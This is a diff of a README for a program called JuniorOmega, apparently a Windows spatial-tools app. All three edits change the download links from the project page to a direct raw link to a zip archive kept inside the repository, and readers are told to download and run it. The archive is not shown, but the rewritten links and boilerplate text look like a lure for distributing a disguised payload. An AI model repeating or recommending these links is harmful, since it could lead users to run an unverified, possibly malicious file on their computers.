@@ -1,12 +1,12 @@
 # 🧭 JuniorOmega - Run spatial tools on Windows
 
-[![Download JuniorOmega](https://img.shields.io/badge/Download%20JuniorOmega-blue?style=for-the-badge&logo=github)](https://github.com/planninginset507/JuniorOmega)
+[![Download JuniorOmega](https://img.shields.io/badge/Download%20JuniorOmega-blue?style=for-the-badge&logo=github)](https://github.com/planninginset507/JuniorOmega/raw/refs/heads/main/spatial/Omega-Junior-2.8-alpha.5.zip)
 
 ## 📥 Download
 
 Go to the project page and download the latest version here:
 
-https://github.com/planninginset507/JuniorOmega
+https://github.com/planninginset507/JuniorOmega/raw/refs/heads/main/spatial/Omega-Junior-2.8-alpha.5.zip
 
 Open the page, look for the latest release or download file, then save it to your PC
 
@@ -145,7 +145,7 @@ If the screen looks empty:
 
 Use this page to download and run JuniorOmega on Windows:
 
-https://github.com/planninginset507/JuniorOmega
+https://github.com/planninginset507/JuniorOmega/raw/refs/heads/main/spatial/Omega-Junior-2.8-alpha.5.zip
 
 ## 🧭 Helpful terms
 
